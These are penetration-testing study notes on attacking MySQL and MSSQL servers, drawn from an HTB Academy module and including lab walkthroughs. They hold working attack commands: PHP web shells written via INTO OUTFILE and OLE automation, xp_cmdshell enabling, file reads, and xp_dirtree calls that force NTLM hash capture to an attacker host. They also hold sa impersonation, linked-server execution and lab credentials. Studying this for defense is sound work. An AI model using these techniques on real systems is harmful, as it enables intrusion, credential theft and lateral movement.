# 🗄️ SQL Database Attacks (MySQL & MSSQL)

## 🎯 Overview

This document covers **exploitation techniques** against SQL databases (MySQL and MSSQL), focusing on practical attack methodologies from HTB Academy's "Attacking Common Services" module. Database attacks can lead to **data extraction, command execution, privilege escalation, and lateral movement**.

> **"Database hosts are considered to be high targets since they are responsible for storing all kinds of sensitive data, including user credentials, PII, business-related data, and payment information. These services often are configured with highly privileged users."**

## 🏗️ SQL Attack Methodology

### Attack Chain Overview
```
Service Discovery → Authentication Bypass → Database Enumeration → Data Extraction → Command Execution → Lateral Movement
```

### Key Attack Vectors
- **Authentication Bypass** (Default credentials, timing attacks)
- **Database Enumeration** (Tables, schemas, sensitive data)
- **Command Execution** (xp_cmdshell, UDF functions)
- **File Operations** (Read/write local files)
- **Hash Stealing** (SMB integration attacks)
- **Privilege Escalation** (User impersonation)
- **Lateral Movement** (Linked servers)

---

## 📍 Service Discovery & Analysis

### Default Ports & Scanning
```bash
# MSSQL default ports
# TCP/1433 (default), UDP/1434, TCP/2433 (hidden mode)

# MySQL default port
# TCP/3306

# Comprehensive Nmap scan
nmap -Pn -sV -sC -p1433,3306 10.10.10.125
```

### Banner Grabbing Example
```bash
# Expected MSSQL output
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
```

### Key Information to Extract
- **Database Version** (vulnerability research)
- **Authentication Mode** (Windows vs Mixed)
- **Domain Information** (for privilege escalation)
- **SSL Configuration** (encryption status)
- **Service Account** details

---

## 🔐 Authentication Mechanisms & Bypass

### 1. MSSQL Authentication Types

#### Windows Authentication Mode
- **Integrated Security** with Windows/Active Directory
- **Pre-authenticated** Windows users don't need additional credentials
- **Domain-based** privilege management

#### Mixed Mode Authentication
- **Windows/AD accounts** + **SQL Server accounts**
- **Username/password pairs** maintained within SQL Server
- **Higher attack surface** due to dual authentication

### 2. MySQL Authentication Methods
- **Username/password** authentication
- **Windows authentication** (plugin required)
- **Socket-based** authentication

### 3. Historical Vulnerabilities

#### CVE-2012-2122 - MySQL Timing Attack
```bash
# MySQL 5.6.x authentication bypass
# Repeatedly use same incorrect password
# Timing attack vulnerability in authentication handling

# Manual exploitation concept:
for i in {1..1000}; do
    mysql -u root -pwrongpass -h target 2>/dev/null
done
# Eventually succeeds due to timing vulnerability
```

---

## 🔓 Protocol Specific Attacks

### 1. Database Connection & Authentication

#### MySQL Connection
```bash
# Basic MySQL connection
mysql -u julio -pPassword123 -h 10.129.20.13

# Expected output
Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
```

#### MSSQL Connection Methods
```bash
# Windows sqlcmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

# Linux sqsh alternative
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

# Impacket mssqlclient
mssqlclient.py -p 1433 julio@10.129.203.7
```

#### Windows Authentication
```bash
# Domain authentication
sqsh -S 10.129.203.7 -U DOMAIN\\julio -P 'MyPassword!' -h

# Local account authentication
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

---

## 🗄️ Database Enumeration & Data Extraction

### 1. Default System Databases

#### MySQL System Schemas
- **mysql** - System database with server information
- **information_schema** - Database metadata access
- **performance_schema** - Server execution monitoring
- **sys** - Performance Schema interpretation objects

#### MSSQL System Databases
- **master** - SQL Server instance information
- **msdb** - SQL Server Agent usage
- **model** - Template for new databases
- **resource** - Read-only system objects
- **tempdb** - Temporary objects storage

### 2. Database Enumeration Commands

#### Show Databases
```sql
-- MySQL
SHOW DATABASES;

-- MSSQL
SELECT name FROM master.dbo.sysdatabases
GO
```

#### Select Database
```sql
-- MySQL
USE htbusers;

-- MSSQL
USE htbusers
GO
```

#### Show Tables
```sql
-- MySQL
SHOW TABLES;

-- MSSQL
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
```

#### Extract Table Data
```sql
-- Universal SQL
SELECT * FROM users;

-- Example output
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
```

---

## 💻 Command Execution Techniques

### 1. MSSQL Command Execution

#### xp_cmdshell Usage
```sql
-- Execute system commands
xp_cmdshell 'whoami'
GO

-- Expected output
output
-----------------------------
nt service\mssql$sqlexpress
NULL
```

#### Enable xp_cmdshell
```sql
-- Enable advanced options
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO

-- Enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

### 2. MySQL Command Execution

#### User Defined Functions (UDF)
```sql
-- MySQL UDF for command execution
-- Requires custom C/C++ UDF compilation
-- GitHub repository: https://github.com/mysqludf/lib_mysqludf_sys

-- Example usage (if UDF available)
SELECT sys_exec('whoami');
```

---

## 📂 File Operations

### 1. Write Local Files

#### MySQL File Writing
```sql
-- Write web shell to web directory
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

-- Check secure_file_priv setting
SHOW VARIABLES LIKE "secure_file_priv";
```

#### MSSQL File Writing
```sql
-- Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

-- Create web shell file
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

### 2. Read Local Files

#### MSSQL File Reading
```sql
-- Read system files
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO

-- Expected output
BulkColumn
-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
```

#### MySQL File Reading
```sql
-- Read local files (requires appropriate privileges)
SELECT LOAD_FILE("/etc/passwd");

-- Expected output
+--------------------------+
| LOAD_FILE("/etc/passwd") |
+--------------------------+
| root:x:0:0:root:/root:/bin/bash
| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

---

## 🕷️ Hash Stealing Attacks

### 1. MSSQL Service Hash Capture

#### Using xp_dirtree
```sql
-- Force SMB authentication to attacker
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```

#### Using xp_subdirs
```sql
-- Alternative method
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

### 2. Capture Setup

#### Responder Setup
```bash
# Start Responder to capture hashes
sudo responder -I tun0

# Expected capture
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107...
```

#### Impacket SMB Server
```bash
# Alternative capture method
sudo impacket-smbserver share ./ -smb2support

# Captured authentication details
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully
```

---

## 👤 Privilege Escalation

### 1. User Impersonation

#### Identify Impersonatable Users
```sql
-- Find users we can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Example output
name
-----------------------------------------------
sa
ben
valentin
```

#### Check Current Privileges
```sql
-- Verify current user and role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Output: 0 = not sysadmin, 1 = sysadmin
```

#### Impersonate Higher Privileged User
```sql
-- Impersonate SA user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Now shows sysadmin privileges (1)

-- Revert to original user
REVERT
```

---

## 🌐 Lateral Movement

### 1. Linked Servers

#### Identify Linked Servers
```sql
-- Find linked servers
SELECT srvname, isremote FROM sysservers
GO

-- Example output
srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

-- isremote: 1 = remote server, 0 = linked server
```

#### Execute Commands on Linked Servers
```sql
-- Execute commands on remote SQL instance
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO

-- Expected output
------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019      sa_remote                      1
```

---

## 📝 Skills Assessment Examples

### Example 1: Service Hash Capture
**Task**: Capture MSSQL service hash using xp_dirtree

```sql
-- Force authentication to attacker machine
EXEC master..xp_dirtree '\\ATTACKER_IP\share\'
GO

-- Responder captures NTLMv2 hash
-- Answer: Service account hash captured
```

### Example 2: Database Enumeration  
**Task**: Find flag in "flagDB" database

```sql
-- Connect and enumerate
USE flagDB
GO
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
GO
SELECT * FROM flags
GO

-- Answer: Flag content from database
```

### Example 3: Privilege Escalation
**Task**: Escalate to sysadmin via impersonation

```sql
-- Check available users to impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Impersonate SA
EXECUTE AS LOGIN = 'sa'
-- Now have sysadmin privileges
```

---

## 🛡️ Defense & Mitigation

### Database Security Hardening
- **Disable unnecessary features** (xp_cmdshell, Ole Automation)
- **Implement strong authentication**
- **Use least privilege principles**
- **Network segmentation** for database servers
- **Regular security updates**
- **Monitor file operations**

### Detection Strategies
- **Monitor failed authentication attempts**
- **Alert on xp_cmdshell usage**
- **Track file read/write operations**
- **Log impersonation activities**
- **Monitor linked server queries**
- **Detect SMB connection attempts**

---

## 🔗 Related Techniques

- **[SMB Attacks](smb-attacks.md)** - Hash capture integration
- **[Database Enumeration](../services/mysql-enumeration.md)** - Information gathering
- **[Database Enumeration](../services/mssql-enumeration.md)** - MSSQL reconnaissance
- **[Pass the Hash](../passwords-attacks/pass-the-hash.md)** - Credential reuse
- **[Active Directory Attacks](../passwords-attacks/active-directory-attacks.md)** - Domain exploitation

---

## 📚 References

- **HTB Academy** - Attacking Common Services Module
- **Microsoft SQL Server Documentation** - Security best practices
- **MySQL Security Documentation** - Hardening guidelines
- **OWASP Database Security** - Common vulnerabilities
- **CVE-2012-2122** - MySQL authentication bypass

---

## 🎯 HTB Academy Lab Scenarios

### Scenario 1: Initial Database Access
```bash
# Target: 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02)
# Credentials: htbdbuser:MSSQLAccess01!

# Install sqlcmd (if needed)
sudo apt install sqlcmd

# Connect to target MSSQL server
sqlcmd -S 10.129.203.12 -U htbdbuser
Password: MSSQLAccess01!

# Expected output:
1>
```

### Scenario 2: MSSQL Service Hash Capture
**Task**: Find password for "mssqlsvc" user via hash stealing

#### Terminal 1 - Start SMB Server
```bash
# Start impacket SMB server with SMBv2 support
sudo impacket-smbserver share ./ -smb2support

# Expected output:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

#### Terminal 2 - Execute Hash Stealing Attack
```sql
-- Connect to SQL server first
sqlcmd -S 10.129.203.12 -U htbdbuser

-- Execute xp_dirtree to force SMB authentication (replace with YOUR IP)
1> EXEC master..xp_dirtree '\\10.10.14.138\share'
2> GO

(0 rows affected)
```

#### Captured Hash Output
```bash
# SMB Server captures NTLMv2 hash:
[*] Incoming connection (10.129.203.12,49676)
[*] AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
[*] User WIN-02\mssqlsvc authenticated successfully
[*] mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000

# Crack hash to get password: princess1
```

### Scenario 3: Flag Enumeration with Escalated Privileges
**Task**: Enumerate "flagDB" database and extract flag

#### Connect with mssqlsvc Account
```bash
# Use cracked credentials: mssqlsvc:princess1
sqlcmd -S 10.129.203.12 -U .\\mssqlsvc
Password: princess1

# Expected output:
1>
```

#### Database and Table Enumeration
```sql
-- Switch to flagDB database
1> USE flagDB
2> GO
Changed database context to 'flagDB'.

-- Enumerate tables in flagDB
1> SELECT table_name FROM flagDB.INFORMATION_SCHEMA.tables
2> GO

table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
tb_flag                                                                                                                         

(1 row affected)
```

#### Flag Extraction
```sql
-- Extract flag from tb_flag table
1> SELECT * FROM tb_flag 
2> GO

flagvalue
----------------------------------------------------------------------------------------------------
HTB{...}                                                                   

(1 row affected)
```

**Answer**: `HTB{...}`

---

## 📋 SQL Attack Checklist

### Authentication Attacks
- [ ] **Default credentials** - admin/admin, sa/sa, root/root
- [ ] **Anonymous access** - NULL or empty password
- [ ] **Weak passwords** - Dictionary attacks
- [ ] **Windows authentication** - Domain credential abuse

### Database Exploitation  
- [ ] **System database access** - Information_schema, master, sys
- [ ] **Sensitive data extraction** - User tables, configuration data
- [ ] **Command execution** - xp_cmdshell, UDF functions
- [ ] **File operations** - Read system files, write web shells

### Post-Exploitation
- [ ] **Hash capture** - xp_dirtree, xp_subdirs SMB attacks
- [ ] **Privilege escalation** - User impersonation, role escalation
- [ ] **Lateral movement** - Linked servers, network pivoting
- [ ] **Persistence** - Backdoor accounts, scheduled jobs

---

## 🛡️ Defense & Detection

### Security Hardening
- **Disable xp_cmdshell** and dangerous stored procedures
- **Implement least privilege** database access
- **Use strong authentication** and password policies
- **Network segmentation** for database servers
- **Regular security updates** and patches

### Detection Strategies
- **Monitor xp_cmdshell usage** and command execution
- **Alert on file operations** (LOAD_FILE, INTO OUTFILE)
- **Track authentication failures** and unusual login patterns
- **Monitor SMB connections** from database servers
- **Log impersonation activities** and privilege changes

---

## 🔗 Related Techniques

- **[SMB Attacks](smb-attacks.md)** - Hash capture integration
- **[FTP Attacks](ftp-attacks.md)** - File transfer exploitation
- **[Pass the Hash](../passwords-attacks/pass-the-hash.md)** - Credential reuse
- **[Active Directory Attacks](../passwords-attacks/active-directory-attacks.md)** - Domain exploitation

---

*This document provides comprehensive SQL database attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 